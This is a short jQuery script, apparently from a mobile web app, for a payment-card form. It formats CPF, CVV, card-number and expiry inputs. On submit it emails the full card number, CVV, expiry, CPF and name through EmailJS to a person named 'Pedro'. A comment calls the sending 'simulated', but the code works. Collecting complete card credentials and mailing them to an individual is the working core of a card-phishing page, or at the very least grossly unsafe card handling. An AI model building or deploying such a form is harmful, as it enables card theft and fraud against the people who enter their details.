$(document).ready(function () {
  $("#cpf").on("input", function () {
    this.value = formatarCPF(this.value);
  });

  $("#cvv").on("input", function () {
    this.value = formatarCVV(this.value);
  });

  $("#numero-cartao").on("input", function () {
    this.value = formatarNumeroCartao(this.value);
  });

  $("#validade").on("input", function () {
    this.value = formatarValidade(this.value);
  });

  $("#form-card").on("submit", function (e) {
    e.preventDefault();
    $("#loading").show();

    const templateParams = {
      to_name: "Pedro",
      from_name: $("#nome").val(),
      cpf: $("#cpf").val(),
      cvv: $("#cvv").val(),
      val: $("#validade").val(),
      num_cart: $("#numero-cartao").val(),
    };

    // Simulando envio com emailjs
    emailjs.send("service_x0jzwgl", "template_qad8pul", templateParams).then(
      function () {
        $("#loading").hide();
        app.dialog.alert("Dados enviados com sucesso!");
      },
      function (error) {
        $("#loading").hide();
        app.dialog.alert("Erro ao enviar: " + JSON.stringify(error));
      }
    );
  });
});

function formatarCPF(valor) {
  return valor
    .replace(/\D/g, "")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function formatarCVV(valor) {
  return valor.replace(/\D/g, "").slice(0, 3);
}

function formatarNumeroCartao(valor) {
  return valor
    .replace(/\D/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

function formatarValidade(valor) {
  return valor
    .replace(/\D/g, "")
    .replace(/(\d{2})(\d)/, "$1/$2")
    .slice(0, 5);
}
